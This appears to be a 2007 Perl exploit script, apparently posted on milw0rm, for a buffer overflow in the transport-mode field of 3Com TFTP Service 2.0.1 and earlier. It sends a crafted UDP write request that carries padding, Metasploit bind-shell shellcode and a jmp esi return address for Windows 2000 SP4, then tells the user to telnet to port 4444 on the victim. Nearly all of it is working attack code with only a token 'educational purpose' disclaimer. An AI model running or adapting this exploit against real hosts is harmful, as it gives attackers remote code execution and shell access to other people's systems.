#!/usr/bin/perl -w
# ===============================================================================================
#                3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit
#                               By Umesh Wanve (umesh_345@yahoo.com)
# ==============================================================================================          
# Credits : Liu Qixu is credited with the discovery of this vulnerability.
#
# Reference : https://www.securityfocus.com/bid/21301
#
# Date : 27-02-2007
#
# Tested on Windows 2000 SP4 Server English
#           Windows 2000 SP4 Professional English
#
# You can replace shellcode with your favourite one :)
#
# 
# Buffer overflow exists in transporting mode name of TFTP server.
# 
# So here you go.
#
# Buffer = "\x00\x02"      +  "filename"    +  "\x00" +  nop sled +  Shellcode + JUMP  + "\x00";
# 
#
# This was written for educational purpose. Use it at your own risk.Author will be not be responsible for any damage.
#
# #
#===============================================================================================
use IO::Socket;

if(!($ARGV[1]))
{
 print "\n3COM Tftp long transport name exploit\n";
 print "\tCoded by Umesh wanve\n\n";
 print "Use: 3com_tftp.pl <host> <port>\n\n";
 exit;
}


$target = IO::Socket::INET->new(Proto=>'udp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die "Cannot connect to $ARGV[0] on port $ARGV[1]";



# win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
 
my($shellcode)=
"\xbf\x38\x0b\x5a\xf1\xdb\xc3\xd9\x74\x24\xf4\x5e\x31\xc9" .
"\xb1\x53\x83\xc6\x04\x31\x7e\x0e\x03\x46\x05\xb8\x04\x4a" .
"\xf1\xbe\xe7\xb2\x02\xdf\x6e\x57\x33\xdf\x15\x1c\x64\xef" .
"\x5e\x70\x89\x84\x33\x60\x1a\xe8\x9b\x87\xab\x47\xfa\xa6" .
"\x2c\xfb\x3e\xa9\xae\x06\x13\x09\x8e\xc8\x66\x48\xd7\x35" .
"\x8a\x18\x80\x32\x39\x8c\xa5\x0f\x82\x27\xf5\x9e\x82\xd4" .
"\x4e\xa0\xa3\x4b\xc4\xfb\x63\x6a\x09\x70\x2a\x74\x4e\xbd" .
"\xe4\x0f\xa4\x49\xf7\xd9\xf4\xb2\x54\x24\x39\x41\xa4\x61" .
"\xfe\xba\xd3\x9b\xfc\x47\xe4\x58\x7e\x9c\x61\x7a\xd8\x57" .
"\xd1\xa6\xd8\xb4\x84\x2d\xd6\x71\xc2\x69\xfb\x84\x07\x02" .
"\x07\x0c\xa6\xc4\x81\x56\x8d\xc0\xca\x0d\xac\x51\xb7\xe0" .
"\xd1\x81\x18\x5c\x74\xca\xb5\x89\x05\x91\xd1\x7e\x24\x29" .
"\x22\xe9\x3f\x5a\x10\xb6\xeb\xf4\x18\x3f\x32\x03\x5e\x6a" .
"\x82\x9b\xa1\x95\xf3\xb2\x65\xc1\xa3\xac\x4c\x6a\x28\x2c" .
"\x70\xbf\xc5\x24\xd7\x10\xf8\xc9\xa7\xc0\xbc\x61\x40\x0b" .
"\x33\x5e\x70\x34\x99\xf7\x19\xc9\x22\xe6\x85\x44\xc4\x62" .
"\x26\x01\x5e\x1a\x84\x76\x57\xbd\xf7\x5c\xcf\x29\xbf\xb6" .
"\xc8\x56\x40\x9d\x7e\xc0\xcb\xf2\xba\xf1\xcb\xde\xea\x66" .
"\x5b\x94\x7a\xc5\xfd\xa9\x56\xbd\x9e\x38\x3d\x3d\xe8\x20" .
"\xea\x6a\xbd\x97\xe3\xfe\x53\x81\x5d\x1c\xae\x57\xa5\xa4" .
"\x75\xa4\x28\x25\xfb\x90\x0e\x35\xc5\x19\x0b\x61\x99\x4f" .
"\xc5\xdf\x5f\x26\xa7\x89\x09\x95\x61\x5d\xcf\xd5\xb1\x1b" .
"\xd0\x33\x44\xc3\x61\xea\x11\xfc\x4e\x7a\x96\x85\xb2\x1a" .
"\x59\x5c\x77\x2a\x10\xfc\xde\xa3\xfd\x95\x62\xae\xfd\x40" .
"\xa0\xd7\x7d\x60\x59\x2c\x9d\x01\x5c\x68\x19\xfa\x2c\xe1" .
"\xcc\xfc\x83\x02\xc5";



print "++ Building Malicous Packet .....\n";

$padding="A" x 118;  


$jmp_xp = "\x4E\xAE\x3A\x7E";                              # jmp esi user32.dll windows 2000 sp4 english (on 27-02-2007)


$exploit = "\x00\x02";                                      #write request (header)

$exploit=$exploit."A";                                      #file name   

$exploit=$exploit."\x00";                                   #Start of transporting name

$exploit=$exploit.$padding;                                 #nop sled to land into shellcode 

$exploit=$exploit.$shellcode;                               #our Hell code 

$exploit=$exploit.$jmp_xp;                               	#jump to shellcode 

$exploit=$exploit."\x00";                                   #end of TS mode name



print $target $exploit;                                     #Attack on victim

print "++ Exploit packet sent ...\n";

print "++ Done.\n";

print "++ Telnet to 4444 on victim's machine ....\n";
sleep(2);


close($target);

exit;

#------------------------------------------------------------------------------------------------------------

# milw0rm.com [2007-02-28]
